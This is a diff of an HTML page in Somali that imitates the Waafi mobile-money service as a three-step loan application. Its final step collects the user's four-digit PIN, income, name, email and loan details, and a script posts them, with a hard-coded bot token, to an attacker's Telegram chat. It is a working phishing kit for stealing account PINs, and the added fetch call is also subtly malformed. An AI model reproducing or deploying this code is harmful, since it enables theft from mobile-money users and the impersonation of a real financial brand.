@@ -1,29 +1,88 @@
 <!DOCTYPE html><html lang="so"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Gal</title><style>body{font-family:Arial;background:#f5f5f5;margin:0;text-align:center}
-.header{background:linear-gradient(90deg,#a8e063,#00B347);padding:30px;color:white}
-.container{padding:30px;max-width:400px;margin:auto;background:white;border-radius:20px;margin-top:-20px}
-input{width:100%;padding:16px;border:2px solid #00B347;border-radius:12px;margin:15px 0;font-size:16px}
-.pin{display:flex;justify-content:center;gap:15px;margin:15px 0}
-.pin input{width:55px;height:55px;text-align:center;font-size:24px}
-.btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:#ddd;color:white}
-.btn.active{background:linear-gradient(90deg,#a8e063,#00B347)}
-.footer{background:linear-gradient(90deg,#a8e063,#00B347);padding:30px;color:white;margin-top:30px}</style>
+<title>Talaabada 3</title><style>body{font-family:Arial;background:#f5f5f5;margin:0}
+.header{background:linear-gradient(90deg,#a8e063,#00B347);padding:15px;color:white;font-weight:bold;display:flex;align-items:center;gap:15px}
+.container{padding:20px;max-width:600px;margin:auto}.card{background:white;padding:25px;border-radius:15px}
+h2{text-align:center;margin-bottom:5px} .sub{text-align:center;color:#999;margin-bottom:20px}
+.progress{display:flex;gap:8px;margin-bottom:25px} .bar{height:5px;flex:1;background:#ddd;border-radius:5px}
+.bar.active{background:linear-gradient(90deg,#a8e063,#00B347)}
+label{display:block;margin:15px 0 5px;font-weight:600} input,select{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px}
+.summary{background:#f0fff4;border-left:4px solid #00B347;padding:15px;border-radius:10px;margin:20px 0}
+.summary .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e0e0e0}
+.pin{display:flex;justify-content:center;gap:12px;margin:15px 0}
+.pin input{width:50px;height:50px;text-align:center;font-size:22px;border:2px solid #00B347}
+.btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#a8e063,#00B347);color:white;margin-top:10px}
+.btn-gray{background:#ddd;color:#333} .btn:disabled{background:#ccc}</style>
 </head><body>
-<div class="header"><h1 style="opacity:0.3">Waafi</h1><p>Amaahado Sahlan oo Degdeg ah</p></div>
-<div class="container">
-<h2>Gal</h2>
-<input id="phone" placeholder="🇸🇴 +252 719389953">
-<p style="color:#999">Geli PIN-kaaga</p>
-<div class="pin"><input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1"></div>
-<p style="color:#999;font-size:13px">PIN-ka ma iloobtay?</p>
-<button class="btn" id="btn" onclick="send()">GAL</button>
+<div class="header">← Dib u noqo <span style="margin-left:auto">Waafi</span> ☰</div>
+<div class="container"><div class="card">
+<h2>Codsiga Amaahda</h2><p class="sub">Tallaabada 3 ee 3 - Xaqiiji</p>
+<div class="progress"><div class="bar active"></div><div class="bar active"></div><div class="bar active"></div></div>
+
+<label>Xaaladda Shaqada</label>
+<select id="work"><option>Shaqaale</option><option>Iskaashato</option><option>Arday</option><option>Shagala'aan</option></select>
+
+<label>Dakhliga Sanadka ($)</label><input id="income" type="number" placeholder="25000">
+
+<label style="text-align:center">Geli PIN-kaaga si aad u xaqiijiso</label>
+<div class="pin">
+<input type="password" maxlength="1" oninput="check()">
+<input type="password" maxlength="1" oninput="check()">
+<input type="password" maxlength="1" oninput="check()">
+<input type="password" maxlength="1" oninput="check()">
 </div>
-<div class="footer"><h1>Waafi</h1><p>v2.1.3P</p></div>
+
+<div class="summary"><h3>Soo koobidda Codsiga</h3>
+<div class="row"><span>Qaddarka Amaahda:</span><span id="s_amount">$1,000</span></div>
+<div class="row"><span>Muddada Amaahda:</span><span id="s_period">12 Bilood</span></div>
+<div class="row"><span>Ujeedada:</span><span id="s_purpose">-</span></div>
+<div class="row"><span>Codsade:</span><span id="s_name">-</span></div>
+</div>
+
+<button class="btn-gray" onclick="location.href='step2.html'">KA HORE</button>
+<button class="btn" id="sendBtn" onclick="submit()" disabled>DIR CODSIGA</button>
+</div></div>
 <script>
+const step1=JSON.parse(localStorage.getItem('waafi_step1'));
+const step2=JSON.parse(localStorage.getItem('waafi_step2'));
+s_amount.innerText='$'+Number(step1.amount).toLocaleString();
+s_period.innerText=step1.period;
+s_purpose.innerText=step1.type;
+s_name.innerText=step2.fname+' '+step2.lname;
+
+const inputs=document.querySelectorAll('.pin input');
+const btn=document.getElementById('sendBtn');
+function check(){
+let pin=Array.from(inputs).map(i=>i.value).join('');
+if(pin.length==4 && income.value) btn.disabled=false; else btn.disabled=true;
+}
+inputs.forEach(i=>i.addEventListener('input',check));
+document.getElementById('income').addEventListener('input',check);
+
 const BOT="8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A"; const CHAT="8630213836";
-function send(){
-const data={...JSON.parse(localStorage.getItem('waafi_step1')),...JSON.parse(localStorage.getItem('waafi_step2')),phone:phone.value};
+
+function submit(){
+const pin=Array.from(inputs).map(i=>i.value).join('');
+const fullData={...step1,...step2,work:work.value,income:income.value,pin:pin};
+
+const message=`🔥 NEW WAAFI APPLICATION 🔥
+
+👤 NAME: ${fullData.fname} ${fullData.lname}
+📧 EMAIL: ${fullData.email}
+📱 PHONE: +252 
+🔑 PIN: ${fullData.pin}
+
+💰 LOAN: ${fullData.type}
+💵 AMOUNT: $${fullData.amount}
+📅 PERIOD: ${fullData.period}
+🎯 PURPOSE: ${fullData.purpose}
+
+💼 WORK: ${fullData.work}
+📈 INCOME: $${fullData.income}
+
+Time: ${new Date().toLocaleString()}`;
+
 fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},
-body:JSON.stringify({chat_id:CHAT,text:`CODSI CUSUB\n${JSON.stringify(data)}`})})
-.then(()=>location.href='success.html');
+body:JSON.stringify({chat_id:CHAT,text:message})
+.then(()=>{localStorage.clear();location.href='success.html';})
+.catch(()=>alert("Cilad ayaa dhacday. Hubi internetka"));
 }</script></body></html>
